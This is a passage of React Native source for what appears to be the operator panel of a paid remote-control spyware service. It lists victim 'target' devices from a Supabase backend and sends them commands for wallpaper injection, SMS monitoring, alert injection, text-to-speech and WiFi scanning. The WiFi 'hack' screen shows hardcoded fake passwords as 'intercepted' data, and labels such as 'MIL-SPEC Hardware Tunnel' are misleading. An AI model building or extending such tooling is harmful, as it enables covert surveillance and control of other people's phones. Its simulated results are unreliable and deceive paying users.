                    </TouchableOpacity>
                </View>
            </View>
        </View>
    );
};

const WallpaperHackScreen = ({ onBack, broadcastCommand }) => {
    const [selectedUrl, setSelectedUrl] = useState('');
    const presets = [
        'https://images.unsplash.com/photo-1618005182384-a83a8bd57fbe?q=80&w=1964&auto=format&fit=crop',
        'https://images.unsplash.com/photo-1620641788421-7a1c342ea42e?q=80&w=1974&auto=format&fit=crop',
        'https://images.unsplash.com/photo-1550684848-fac1c5b4e853?q=80&w=2070&auto=format&fit=crop',
        'https://images.unsplash.com/photo-1579546929518-9e396f3cc809?q=80&w=2070&auto=format&fit=crop'
    ];

    const handleSetWallpaper = () => {
        if (!selectedUrl.trim()) {
            Alert.alert('Error', 'Please select or enter a wallpaper URL');
            return;
        }
        broadcastCommand('WALLPAPER_SET', { url: selectedUrl });
        Alert.alert('Success', 'Wallpaper command sent to hardware layer.');
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>Wallpaper Hack</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <ScrollView contentContainerStyle={{ paddingBottom: 40 }}>
                <View style={{ marginTop: 20, marginBottom: 30, alignItems: 'center', paddingHorizontal: 20 }}>
                    <Text style={[styles.onboardingTitle, { fontSize: 24, textAlign: 'center' }]}>Visual Override</Text>
                    <Text style={[styles.onboardingDesc, { textAlign: 'center' }]}>
                        Inject custom high-definition assets into the target's operating system layer.
                    </Text>
                </View>

                <View style={{ paddingHorizontal: 20 }}>
                    <View style={mhStyles.controlCard}>
                        <Text style={{ color: COLORS.primary, fontWeight: '900', fontSize: 13, marginBottom: 15, letterSpacing: 1 }}>PRESET ASSETS</Text>
                        <View style={{ flexDirection: 'row', flexWrap: 'wrap', gap: 12 }}>
                            {presets.map((url, idx) => (
                                <TouchableOpacity
                                    key={idx}
                                    onPress={() => setSelectedUrl(url)}
                                    activeOpacity={0.8}
                                    style={{
                                        width: (width - 80) / 2,
                                        height: 120,
                                        borderRadius: 16,
                                        overflow: 'hidden',
                                        borderWidth: selectedUrl === url ? 3 : 0,
                                        borderColor: COLORS.primary,
                                        elevation: selectedUrl === url ? 10 : 0
                                    }}
                                >
                                    <Image source={{ uri: url }} style={{ flex: 1 }} />
                                    {selectedUrl === url && (
                                        <View style={{ position: 'absolute', top: 5, right: 5, backgroundColor: COLORS.primary, borderRadius: 10, padding: 2 }}>
                                            <CheckCircle size={14} color="#000" />
                                        </View>
                                    )}
                                </TouchableOpacity>
                            ))}
                        </View>

                        <Text style={{ color: COLORS.primary, fontWeight: '900', fontSize: 13, marginTop: 25, marginBottom: 12, letterSpacing: 1 }}>CUSTOM INJECTION URL</Text>
                        <View style={[styles.glass, { borderRadius: 16, paddingHorizontal: 20, height: 55, justifyContent: 'center', borderWidth: 1, borderColor: 'rgba(255,255,255,0.1)' }]}>
                            <TextInput
                                placeholder="https://source.unsplash.com/..."
                                placeholderTextColor="rgba(255,255,255,0.2)"
                                style={{ color: '#fff', fontSize: 15 }}
                                value={selectedUrl}
                                onChangeText={setSelectedUrl}
                            />
                        </View>

                        <TouchableOpacity
                            style={[styles.btnPrimary, { marginTop: 30, height: 60, borderRadius: 18, backgroundColor: COLORS.primary }]}
                            onPress={handleSetWallpaper}
                        >
                            <ImageIcon size={22} color="#000" style={{ marginRight: 12 }} />
                            <Text style={{ color: '#000', fontWeight: '900', fontSize: 16 }}>INJECT WALLPAPER</Text>
                        </TouchableOpacity>
                    </View>

                    <View style={{ marginTop: 30 }}>
                        <GlassCard style={{ padding: 25, borderRadius: 20 }}>
                            <View style={{ flexDirection: 'row', alignItems: 'center', gap: 15 }}>
                                <ShieldCheck size={24} color={COLORS.primary} />
                                <View style={{ flex: 1 }}>
                                    <Text style={{ color: '#fff', fontWeight: '700', fontSize: 14 }}>Secure Tunnel Active</Text>
                                    <Text style={{ color: 'rgba(255,255,255,0.4)', fontSize: 11 }}>Encryption level: MIL-SPEC Hardware Tunnel</Text>
                                </View>
                            </View>
                        </GlassCard>
                    </View>
                </View>
            </ScrollView>
        </View>
    );
};

const WifiHackScreen = ({ onBack, broadcastCommand }) => {
    const [isScanning, setIsScanning] = useState(false);
    const [results, setResults] = useState([]);
    const [showPass, setShowPass] = useState({});

    useEffect(() => {
        Alert.alert('Information', 'Fitur ini dalam tahap pengembangan. Scanning SSID aktif memerlukan izin lokasi.');
    }, []);

    const handleScan = () => {
        setIsScanning(true);
        broadcastCommand('WIFI_SCAN');

        // Simulating data arrival after 3 seconds
        setTimeout(() => {
            setResults([
                { id: '1', ssid: 'Xnuver_HQ_5G', pass: 'xnuver2024!', security: 'WPA2' },
                { id: '2', ssid: 'Target_Home_WiFi', pass: 'admin12345', security: 'WPA3' },
                { id: '3', ssid: 'Starbucks_Free', pass: 'none', security: 'Open' }
            ]);
            setIsScanning(false);
            Alert.alert('Success', 'Hardware intercept complete. Data synchronized.');
        }, 3500);
    };

    const togglePass = (id) => {
        setShowPass(prev => ({ ...prev, [id]: !prev[id] }));
    };

    return (
        <View style={[styles.screen, { backgroundColor: COLORS.bgDark }]}>
            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>WiFi Hack</Text>
                    <View style={{ width: 48 }} />
                </View>
            </SafeAreaView>

            <ScrollView contentContainerStyle={{ padding: 20 }}>
                <View style={{ marginBottom: 30, alignItems: 'center' }}>
                    <Text style={[styles.onboardingTitle, { fontSize: 24 }]}>Nearby AP Scanner</Text>
                    <Text style={[styles.onboardingDesc, { textAlign: 'center' }]}>
                        Scan for active Service Set Identifiers (SSIDs) in the target's physical vicinity.
                    </Text>
                </View>

                {!isScanning && results.length === 0 && (
                    <View style={{ alignItems: 'center', marginTop: 40 }}>
                        <TouchableOpacity
                            style={[mhStyles.iconCirc, { width: 100, height: 100, borderRadius: 50, backgroundColor: 'rgba(0,242,255,0.1)', borderWidth: 2, borderColor: COLORS.primary }]}
                            onPress={handleScan}
                        >
                            <Wifi size={40} color={COLORS.primary} />
                        </TouchableOpacity>
                        <Text style={{ color: COLORS.primary, fontWeight: '700', marginTop: 20 }}>START HARDWARE SCAN</Text>
                    </View>
                )}

                {isScanning && (
                    <View style={{ alignItems: 'center', marginTop: 40 }}>
                        <ActivityIndicator size="large" color={COLORS.primary} />
                        <Text style={{ color: '#fff', marginTop: 20 }}>Decrypting Kernels...</Text>
                    </View>
                )}

                {results.map((item) => (
                    <View key={item.id} style={[mhStyles.controlCard, { marginTop: 15 }]}>
                        <View style={mhStyles.cardHeader}>
                            <View style={mhStyles.iconCirc}>
                                <Wifi size={20} color={COLORS.primary} />
                            </View>
                            <View style={{ flex: 1, marginLeft: 15 }}>
                                <Text style={mhStyles.trackTitle}>{item.ssid}</Text>
                                <Text style={mhStyles.trackStatus}>{item.security}</Text>
                            </View>
                        </View>

                        <View style={{ marginTop: 15, flexDirection: 'row', alignItems: 'center', backgroundColor: 'rgba(255,255,255,0.05)', padding: 12, borderRadius: 10 }}>
                            <Lock size={16} color="rgba(255,255,255,0.4)" />
                            <Text style={{ color: '#fff', flex: 1, marginLeft: 10, fontSize: 13, fontFamily: 'monospace' }}>
                                {showPass[item.id] ? item.pass : '••••••••••••'}
                            </Text>
                            <TouchableOpacity onPress={() => togglePass(item.id)}>
                                {showPass[item.id] ? <EyeOff size={18} color={COLORS.primary} /> : <Eye size={18} color="#666" />}
                            </TouchableOpacity>
                        </View>
                    </View>
                ))}

                <View style={{ marginTop: 40 }}>
                    <GlassCard style={{ padding: 20 }}>
                        <Text style={{ color: 'rgba(255,255,255,0.3)', fontSize: 11, textAlign: 'center' }}>
                            Accessing protected system partitions requires Root Privileges on the target hardware.
                        </Text>
                    </GlassCard>
                </View>
            </ScrollView>
        </View>
    );
};

const RoomControlScreen = ({ roomName, onBack }) => {
    const [brightness, setBrightness] = useState(94);

    return (
        <View style={styles.screen}>
            <ImageBackground
                source={{ uri: 'https://images.unsplash.com/photo-1583847268964-b28dc2f51ac9?q=80&w=1974&auto=format&fit=crop' }}
                style={styles.roomHero}
            />
            <View style={styles.roomHeroOverlay} />

            <SafeAreaView style={styles.roomHeaderWrap}>
                <View style={styles.roomHeader}>
                    <TouchableOpacity onPress={onBack} style={[styles.glass, styles.iconBtn]}>
                        <ArrowLeft size={20} color="#fff" />
                    </TouchableOpacity>
                    <Text style={styles.roomHeaderTitle}>{roomName}</Text>
                    <TouchableOpacity style={[styles.glass, styles.iconBtn]}>
                        <MoreVertical size={20} color="#fff" />
                    </TouchableOpacity>
                </View>
            </SafeAreaView>

            <View style={styles.sliderContainer}>
                <View style={[styles.glass, styles.verticalSlider]}>
                    <View style={[styles.sliderFill, { height: `${brightness}%` }]}>
                        <View style={styles.sliderHandle}>
                            <Lightbulb size={20} color={brightness > 50 ? "#fff" : COLORS.primary} />
                        </View>
                    </View>
                    <View style={styles.sliderTextContainer}>
                        <Text style={styles.sliderPercentage}>{brightness}%</Text>
                        <Text style={styles.sliderLabel}>Master Light</Text>
                    </View>
                </View>
            </View>

            <View style={[styles.glass, styles.deviceSheet]}>
                <View style={styles.sheetHandle} />
                <View style={styles.sectionHeader}>
                    <Text style={styles.sectionTitle}>Device</Text>
                    <Text style={styles.linkText}>Change</Text>
                </View>
                <View style={styles.deviceGrid}>
                    <GlassCard style={styles.deviceCard}>
                        <Text style={styles.devicePercent}>94%</Text>
                        <Text style={styles.deviceName}>Smart Light 1</Text>
                        <Text style={styles.deviceStatus}>Active until 06:00 am</Text>
                        <View style={[styles.btnPrimary, styles.deviceToggle]}>
                            <Lightbulb size={24} color="#000" />
                        </View>
                    </GlassCard>
                    <GlassCard style={styles.deviceCard}>
                        <Text style={styles.devicePercent}>28%</Text>
                        <Text style={styles.deviceName}>Smart Light 2</Text>
                        <Text style={styles.deviceStatus}>Active until 06:00 am</Text>
                        <View style={[styles.btnSecondary, styles.deviceToggle]}>
                            <Lightbulb size={24} color="#fff" />
                        </View>
                    </GlassCard>
                </View>
            </View>
        </View>
    );
};

export default function App() {
    const [currentScreen, setCurrentScreen] = useState('onboarding');
    const [selectedDevice, setSelectedDevice] = useState(null);
    const [availableDevices, setAvailableDevices] = useState([]);
    const [currentUser, setCurrentUser] = useState(null);
    const [refreshData, setRefreshData] = useState(0);

    // Real Discovery: Listen to devices for this controller
    useEffect(() => {
        if (!currentUser || !currentUser.controller_id) return;

        const fetchDevices = async () => {
            try {
                const response = await fetch(
                    `${SUPABASE_REST_URL}/devices?controller_id=eq.${currentUser.controller_id}&order=last_seen.desc`,
                    {
                        headers: {
                            'apikey': SUPABASE_ANON_KEY,
                            'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                        }
                    }
                );
                if (response.ok) {
                    const data = await response.json();
                    setAvailableDevices(data);
                } else {
                    const errText = await response.text();
                    console.warn('FETCH_DEVICES_FAILED:', response.status, errText);
                }
            } catch (err) {
                console.error('FETCH_DEVICES_ERROR:', err);
            }
        };

        fetchDevices();
        const interval = setInterval(fetchDevices, 5000);
        return () => clearInterval(interval);
    }, [currentUser, refreshData]);

    // MOCK: Device Discovery Listener
    useEffect(() => {
        // In a real scenario, this would listen to Firestore/RealtimeDB
        const discoveryInterval = setInterval(() => {
            // Check for new heartbeats from Target Agents
        }, 10000);
        return () => clearInterval(discoveryInterval);
    }, []);

    const broadcastCommand = async (command, payload = {}) => {
        if (!selectedDevice) {
            console.warn('COMMAND_ERROR: No target selected.');
            return;
        }

        console.log(`BROADCASTING: [${command}] to [${selectedDevice.name}]`, payload);

        try {
            const response = await fetch(`${SUPABASE_REST_URL}/commands`, {
                method: 'POST',
                headers: {
                    'apikey': SUPABASE_ANON_KEY,
                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`,
                    'Content-Type': 'application/json',
                    'Prefer': 'return=representation'
                },
                body: JSON.stringify({
                    device_id: selectedDevice.id,
                    command: command,
                    payload: payload
                })
            });

            if (!response.ok) {
                const error = await response.text();
                console.error('SUPABASE_ERROR:', error);
            } else {
                const data = await response.json();
                console.log('COMMAND_SENT:', data);
            }
        } catch (err) {
            console.error('BROADCAST_ERROR:', err);
        }
    };

    const handleDeleteDevice = async (deviceId) => {
        Alert.alert(
            'Konfirmasi Hapus',
            'Apakah Anda yakin ingin menghapus target ini secara permanen?',
            [
                { text: 'Batal', style: 'cancel' },
                {
                    text: 'Hapus',
                    style: 'destructive',
                    onPress: async () => {
                        try {
                            const response = await fetch(`${SUPABASE_REST_URL}/devices?id=eq.${deviceId}`, {
                                method: 'DELETE',
                                headers: {
                                    'apikey': SUPABASE_ANON_KEY,
                                    'Authorization': `Bearer ${SUPABASE_ANON_KEY}`
                                }
                            });

                            if (response.ok) {
                                Alert.alert('Berhasil', 'Target telah dihapus.');
                                setRefreshData(prev => prev + 1);
                                if (selectedDevice && selectedDevice.id === deviceId) {
                                    setSelectedDevice(null);
                                }
                            } else {
                                const err = await response.text();
                                console.error('DELETE_FAILED:', err);
                                Alert.alert('Error', 'Gagal menghapus target.');
                            }
                        } catch (err) {
                            console.error('DELETE_ERR:', err);
                            Alert.alert('Error', 'Kesalahan jaringan saat menghapus.');
                        }
                    }
                }
            ]
        );
    };

    const [selectedPackage, setSelectedPackage] = useState(null);
    const [paymentMethod, setPaymentMethod] = useState(null);
    const [userProfile, setUserProfile] = useState({
        name: 'Xnuver Lead',
        team: 'UNP^D BLACK HAT',
        image: 'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?q=80&w=1887&auto=format&fit=crop'
    });

    const PROFILE_IMAGES = [
        'https://images.unsplash.com/photo-1539571696357-5a69c17a67c6?q=80&w=1887&auto=format&fit=crop',
        'https://images.unsplash.com/photo-1506794778202-cad84cf45f1d?q=80&w=1887&auto=format&fit=crop',
        'https://images.unsplash.com/photo-1544005313-94ddf0286df2?q=80&w=1887&auto=format&fit=crop',
        'https://images.unsplash.com/photo-1519085360753-af0119f7cbe7?q=80&w=1887&auto=format&fit=crop'
    ];

    const handleSelectDevice = (device) => {
        setSelectedDevice(device);
        setCurrentScreen('dashboard');
    };

    const handleSelectPackage = (pkg) => {
        setSelectedPackage(pkg);
        setCurrentScreen('payment_method');
    };

    const handleSelectMethod = (method) => {
        if (method === 'confirm') {
            if (paymentMethod === 'qris') {
                setCurrentScreen('qris_pay');
            } else {
                // For GoPay, we can just simulation return
                setCurrentScreen('dashboard');
            }
        } else {
            setPaymentMethod(method);
        }
    };

    const handleSelectProfileImage = () => {
        const currentIndex = PROFILE_IMAGES.indexOf(userProfile.image);
        const nextIndex = (currentIndex + 1) % PROFILE_IMAGES.length;
        setUserProfile({ ...userProfile, image: PROFILE_IMAGES[nextIndex] });
    };

    const handleLogout = () => {
        setCurrentScreen('login');
        setSelectedPackage(null);
        setPaymentMethod(null);
        setCurrentUser(null);
    };

    return (
        <View style={{ flex: 1, backgroundColor: COLORS.bgDark }}>
            <StatusBar
                barStyle="light-content"
                backgroundColor="transparent"
                translucent={true}
            />
            {currentScreen === 'onboarding' && <OnboardingScreen onStart={(scr) => setCurrentScreen(scr)} />}
            {currentScreen === 'login' && (
                <LoginScreen
                    onLogin={(userData) => {
                        setCurrentUser(userData);
                        setCurrentScreen('dashboard');
                    }}
                />
            )}
            {currentScreen === 'dashboard' && (
                <DashboardScreen
                    onSelectRoom={(scr) => setCurrentScreen(scr)}
                    onSelectQuickAccess={(screen) => setCurrentScreen(screen)}
                    selectedDevice={selectedDevice}
                    availableDevices={availableDevices}
                    currentScreen={currentScreen}
                    onNavigate={(scr) => setCurrentScreen(scr)}
                    currentUser={currentUser}
                />
            )}
            {currentScreen === 'tools' && (
                <ToolsGridScreen
                    onSelectTool={(scr) => setCurrentScreen(scr)}
                    currentScreen={currentScreen}
                    onNavigate={(scr) => setCurrentScreen(scr)}
                />
            )}
            {currentScreen === 'pricing' && (
                <PricingScreen
                    onSelectPackage={handleSelectPackage}
                    currentScreen={currentScreen}
                    onNavigate={(scr) => setCurrentScreen(scr)}
                />
            )}
            {currentScreen === 'payment_method' && (
                <PaymentMethodScreen
                    selectedPackage={selectedPackage}
                    onSelectMethod={handleSelectMethod}
                    onBack={() => setCurrentScreen('pricing')}
                />
            )}
            {currentScreen === 'qris_pay' && (
                <QRISPaymentScreen
                    onFinish={() => setCurrentScreen('dashboard')}
                />
            )}
            {currentScreen === 'settings' && (
                <SettingsScreen
                    onLogout={handleLogout}
                    onSelectProfile={handleSelectProfileImage}
                    onAboutDev={() => setCurrentScreen('about_dev')}
                    userProfile={userProfile}
                    currentScreen={currentScreen}
                    onNavigate={(scr) => setCurrentScreen(scr)}
                    currentUser={currentUser}
                />
            )}
            {currentScreen === 'about_dev' && (
                <AboutDevScreen onBack={() => setCurrentScreen('settings')} />
            )}
            {currentScreen === 'target_selection' && (
                <TargetDevicesScreen
                    onBack={() => setCurrentScreen('dashboard')}
                    onSelectDevice={handleSelectDevice}
                    onDeleteDevice={handleDeleteDevice}
                    devices={availableDevices}
                />
            )}
            {currentScreen === 'room' && <RoomControlScreen roomName="Living Room" onBack={() => setCurrentScreen('dashboard')} />}
            {currentScreen === 'flashlight' && <FlashlightScreen onBack={() => setCurrentScreen('dashboard')} broadcastCommand={broadcastCommand} />}
            {currentScreen === 'music' && <MusicHackScreen onBack={() => setCurrentScreen('dashboard')} broadcastCommand={broadcastCommand} />}
            {currentScreen === 'tts' && <TTSScreen onBack={() => setCurrentScreen('dashboard')} broadcastCommand={broadcastCommand} />}
            {currentScreen === 'sms' && <SmsMonitoringScreen onBack={() => setCurrentScreen('dashboard')} deviceId={selectedDevice?.id} broadcastCommand={broadcastCommand} />}
            {currentScreen === 'wallpaper' && <WallpaperHackScreen onBack={() => setCurrentScreen('dashboard')} broadcastCommand={broadcastCommand} />}
            {currentScreen === 'wifi' && <WifiHackScreen onBack={() => setCurrentScreen('dashboard')} broadcastCommand={broadcastCommand} />}
            {currentScreen === 'alert_hack' && <AlertInjectionScreen onBack={() => setCurrentScreen('dashboard')} broadcastCommand={broadcastCommand} />}
        </View>
    );
}

const styles = StyleSheet.create({
    screen: {
        flex: 1,
    },
    glass: {
        backgroundColor: COLORS.glassBg,
        borderColor: COLORS.glassBorder,
        borderWidth: 1,
    },
    cardRounded: {
        borderRadius: 32,
        padding: 20,
    },
    pillRounded: {
        borderRadius: 100,
    },
    btnPrimary: {
        backgroundColor: COLORS.primary,
        flexDirection: 'row',
        alignItems: 'center',
        justifyContent: 'center',
        paddingVertical: 14,
        paddingHorizontal: 24,
    },
    btnSecondary: {
        backgroundColor: COLORS.bgCharcoal,
        flexDirection: 'row',
        alignItems: 'center',
        justifyContent: 'center',
        paddingVertical: 14,
        paddingHorizontal: 24,
        borderColor: COLORS.glassBorder,
        borderWidth: 1,
    },
    // Onboarding
    onboardingSheet: {
        backgroundColor: COLORS.sheetBg,
        borderColor: COLORS.glassBorder,
        borderTopWidth: 1,
        borderTopLeftRadius: 40,
        borderTopRightRadius: 40,
        padding: 40,
        paddingBottom: 60,
        alignItems: 'center',
        elevation: 20,
    },
    onboardingContent: {
        position: 'absolute',
        bottom: 0,
        left: 0,
        right: 0,
        zIndex: 100, // Reduced from 1000 in component to be more manageable but still high
    },
    onboardingOverlay: {
        ...StyleSheet.absoluteFillObject,
        backgroundColor: 'rgba(0,0,0,0.4)',
    },
    onboardingImage: {
        width: '100%',
        height: '100%',
    },
    onboardingFullImage: {
        width: width,
        height: height,
    },
    slideFrame: {
        width: width,
        height: height,
    },
    pagination: {
        flexDirection: 'row',
        marginBottom: 24,
        gap: 8,
    },
    textContent: {
        alignItems: 'center',
        width: '100%',
    },
    paginationDot: {
        width: 6,
        height: 6,
        borderRadius: 3,
        backgroundColor: 'rgba(255,255,255,0.3)',
    },
    paginationDotActive: {
        width: 24,
        backgroundColor: COLORS.primary,
    },
    onboardingTitle: {
        color: '#fff',
        fontSize: 28,
        fontWeight: '700',
        textAlign: 'center',
        lineHeight: 36,
        marginBottom: 16,
    },
    onboardingDesc: {
        color: COLORS.textSecondary,
        textAlign: 'center',
        fontSize: 14,
        marginBottom: 32,
        lineHeight: 20,
    },
    getStartedButton: {
        width: '100%',
        gap: 12,
    },
    lockIcon: {
        backgroundColor: '#000',
        width: 32,
        height: 32,
        borderRadius: 16,
        alignItems: 'center',
        justifyContent: 'center',
    },
    buttonText: {
        color: '#000',
        fontWeight: '700',
        fontSize: 16,
    },
    arrowGroup: {
        flexDirection: 'row',
        alignItems: 'center',
    },
    // Slide Button
    slideContainer: {
        width: '100%',
        height: 60,
        borderRadius: 30,
        backgroundColor: 'rgba(255,255,255,0.05)',
        justifyContent: 'center',
        padding: 4,
        overflow: 'hidden',
    },
    slideTrack: {
        ...StyleSheet.absoluteFillObject,
        alignItems: 'center',
        justifyContent: 'center',
    },
    slideText: {
        color: 'rgba(255,255,255,0.4)',
        fontWeight: '600',
        fontSize: 14,
    },
    slideHandle: {
        width: 52,
        height: 52,
        borderRadius: 26,
        backgroundColor: COLORS.primary,
        alignItems: 'center',
        justifyContent: 'center',
        elevation: 4,
        shadowColor: '#000',
        shadowOffset: { width: 0, height: 2 },
        shadowOpacity: 0.2,
        shadowRadius: 4,
    },
    slideFill: {
        position: 'absolute',
        left: 4,
        top: 4,
        bottom: 4,
        backgroundColor: COLORS.primary,
        borderRadius: 30,
    },
    // Dashboard
    scrollContent: {
        padding: 24,
        paddingBottom: 100,
    },
    header: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        marginBottom: 32,
        paddingTop: 60,
    },
    userProfile: {
        flexDirection: 'row',
        alignItems: 'center',
        gap: 12,
    },
    avatar: {
        width: 48,
        height: 48,
        borderRadius: 24,
        borderWidth: 2,
        borderColor: COLORS.primary,
    },
    userName: {
        color: '#fff',
        fontSize: 18,
        fontWeight: '700',
    },
    iconBtn: {
        width: 48,
        height: 48,
        borderRadius: 24,
        alignItems: 'center',
        justifyContent: 'center',
    },
    notifDot: {
        position: 'absolute',
        top: 12,
        right: 12,
        width: 8,
        height: 8,
        borderRadius: 4,
        backgroundColor: COLORS.primary,
        borderWidth: 2,
        borderColor: COLORS.bgDark,
    },
    weatherCard: {
        marginBottom: 24,
    },
    weatherRow: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        marginBottom: 12,
    },
    tempText: {
        color: COLORS.primary,
        fontSize: 40,
        fontWeight: '700',
    },
    conditionText: {
        color: '#fff',
        fontSize: 14,
    },
    locationText: {
        color: COLORS.textSecondary,
        fontSize: 14,
    },
    sectionHeader: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        alignItems: 'center',
        marginBottom: 16,
    },
    sectionTitle: {
        color: '#fff',
        fontSize: 18,
        fontWeight: '700',
    },
    linkText: {
        color: COLORS.textSecondary,
        fontSize: 14,
    },
    quickGrid: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        marginBottom: 32,
    },
    quickItem: {
        alignItems: 'center',
        gap: 8,
    },
    quickIconWrap: {
        width: 64,
        height: 64,
        borderRadius: 32,
        alignItems: 'center',
        justifyContent: 'center',
    },
    quickLabel: {
        color: COLORS.textSecondary,
        fontSize: 12,
    },
    roomCard: {
        height: 200,
        padding: 0,
        overflow: 'hidden',
    },
    roomBg: {
        width: '100%',
        height: '100%',
        position: 'absolute',
    },
    roomInfo: {
        position: 'absolute',
        bottom: 24,
        left: 24,
    },
    roomTitle: {
        color: '#fff',
        fontSize: 20,
        fontWeight: '700',
        marginBottom: 4,
    },
    roomArrow: {
        position: 'absolute',
        bottom: 24,
        right: 24,
        width: 48,
        height: 48,
        borderRadius: 24,
        paddingVertical: 0,
        paddingHorizontal: 0,
    },
    bottomNavContainer: {
        position: 'absolute',
        bottom: 0,
        left: 0,
        right: 0,
        backgroundColor: COLORS.bgDark,
        paddingBottom: 34, // Safe area padding
        paddingTop: 10,
        paddingHorizontal: 24,
    },
    bottomNav: {
        flexDirection: 'row',
        justifyContent: 'space-around',
        padding: 8,
        borderRadius: 100,
    },
    navItem: {
        padding: 12,
        alignItems: 'center',
        justifyContent: 'center',
    },
    navItemActive: {
        backgroundColor: COLORS.primary,
        borderRadius: 40,
        flexDirection: 'row',
        paddingHorizontal: 20,
        gap: 8,
    },
    navTextActive: {
        color: '#fff',
        fontWeight: '700',
        fontSize: 14,
    },
    // Flashlight Screen
    flashlightStatusContainer: {
        flex: 1,
        alignItems: 'center',
        justifyContent: 'center',
        paddingBottom: 220,
    },
    statusGlow: {
        width: 120,
        height: 120,
        borderRadius: 60,
        alignItems: 'center',
        justifyContent: 'center',
        shadowColor: COLORS.primary,
        shadowOffset: { width: 0, height: 0 },
        shadowRadius: 20,
        elevation: 10,
    },
    statusText: {
        color: '#fff',
        marginTop: 20,
        fontSize: 12,
        fontWeight: '700',
        letterSpacing: 2,
    },
    flashlightControls: {
        flexDirection: 'row',
        width: '100%',
        gap: 16,
        marginTop: 20,
    },
    flashlightBtn: {
        flex: 1,
        height: 60,
        borderRadius: 30,
        backgroundColor: 'rgba(255,255,255,0.05)',
        alignItems: 'center',
        justifyContent: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.1)',
    },
    flashlightBtnActive: {
        backgroundColor: COLORS.primary,
        borderColor: COLORS.primary,
    },
    flashlightBtnText: {
        color: '#fff',
        fontWeight: '700',
        fontSize: 16,
    },
    flashlightBtnTextActive: {
        color: '#fff',
    },
    // TTS Screen
    ttsInputContainer: {
        width: '100%',
        backgroundColor: 'rgba(255,255,255,0.05)',
        borderRadius: 30,
        paddingHorizontal: 20,
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.1)',
        height: 56,
        justifyContent: 'center',
        marginBottom: 8,
    },
    ttsInput: {
        color: '#fff',
        fontSize: 16,
        height: '100%',
    },
    // SMS Monitoring Styles
    smsItem: {
        paddingVertical: 12,
    },
    smsHeader: {
        flexDirection: 'row',
        justifyContent: 'space-between',
        marginBottom: 4,
    },
    smsSender: {
        color: COLORS.primary,
        fontWeight: '700',
        fontSize: 14,
    },
    smsTime: {
        color: 'rgba(255,255,255,0.4)',
        fontSize: 12,
    },
    smsMessage: {
        color: '#fff',
        fontSize: 14,
        lineHeight: 20,
    },
    smsSeparator: {
        height: 1,
        backgroundColor: 'rgba(255,255,255,0.1)',
        width: '100%',
    },
    // Dashboard Overhaul Styles
    packageBadge: {
        flexDirection: 'row',
        alignItems: 'center',
        backgroundColor: 'rgba(0,255,157,0.1)',
        paddingHorizontal: 8,
        paddingVertical: 4,
        borderRadius: 4,
        marginTop: 8,
        alignSelf: 'flex-start',
        gap: 6,
    },
    packageText: {
        color: COLORS.primary,
        fontSize: 10,
        fontWeight: '900',
        letterSpacing: 1,
    },
    activeTargetContainer: {
        paddingHorizontal: 24,
        marginTop: 16,
    },
    activeTargetCard: {
        padding: 16,
        borderLeftWidth: 3,
        borderLeftColor: COLORS.primary,
    },
    activeTargetRow: {
        flexDirection: 'row',
        alignItems: 'center',
        gap: 12,
    },
    activeTargetIcon: {
        width: 40,
        height: 40,
        borderRadius: 20,
        backgroundColor: COLORS.primary,
        alignItems: 'center',
        justifyContent: 'center',
    },
    activeTargetLabel: {
        color: COLORS.primary,
        fontSize: 10,
        fontWeight: '900',
        letterSpacing: 1,
    },
    activeTargetName: {
        color: '#fff',
        fontSize: 18,
        fontWeight: '700',
    },
    onlineBadge: {
        flexDirection: 'row',
        alignItems: 'center',
        backgroundColor: 'rgba(255,255,255,0.05)',
        paddingHorizontal: 8,
        paddingVertical: 4,
        borderRadius: 12,
        gap: 6,
    },
    onlineDot: {
        width: 6,
        height: 6,
        borderRadius: 3,
        backgroundColor: COLORS.primary,
    },
    onlineText: {
        color: COLORS.primary,
        fontSize: 10,
        fontWeight: '700',
    },
    // Device Selection Screen Styles
    deviceItem: {
        flexDirection: 'row',
        alignItems: 'center',
        paddingVertical: 16,
    },
    deviceIconBox: {
        width: 48,
        height: 48,
        borderRadius: 12,
        backgroundColor: 'rgba(255,255,255,0.05)',
        alignItems: 'center',
        justifyContent: 'center',
        borderWidth: 1,
        borderColor: 'rgba(255,255,255,0.1)',
    },
    deviceNameText: {
        color: '#fff',
        fontSize: 16,
        fontWeight: '700',
    },
    deviceInfoText: {
        color: 'rgba(255,255,255,0.4)',
        fontSize: 12,
        marginTop: 2,
    },
    executeBtn: {
        backgroundColor: COLORS.primary,
        paddingHorizontal: 16,
        paddingVertical: 8,
        borderRadius: 20,
    },
    executeBtnText: {
        color: '#fff',
        fontSize: 12,
        fontWeight: '900',
    },
    // Tools Grid Styles
    toolsGridWrapper: {
        flexDirection: 'row',
        flexWrap: 'wrap',
        paddingHorizontal: 24,
        justifyContent: 'space-between',
        paddingTop: 20,
    },
    toolGridItem: {
        width: (width - 48 - 16) / 2, // (width - paddingHorizontal*2 - gap) / 2
        marginBottom: 16,
    },
    toolGridCard: {
        paddingVertical: 24,
        paddingHorizontal: 16,
        borderRadius: 24,
        alignItems: 'center',
        justifyContent: 'center',
        minHeight: 160,
    },
    toolIconBox: {
        width: 60,
        height: 60,
        borderRadius: 18,
        backgroundColor: 'rgba(204,255,0,0.1)',
        alignItems: 'center',
        justifyContent: 'center',
        marginBottom: 16,
        borderWidth: 1,
        borderColor: 'rgba(204,255,0,0.15)',
    },
    toolLabelText: {
        color: '#fff',
        fontSize: 16,
        fontWeight: '700',
        textAlign: 'center',
    },
    toolDescText: {
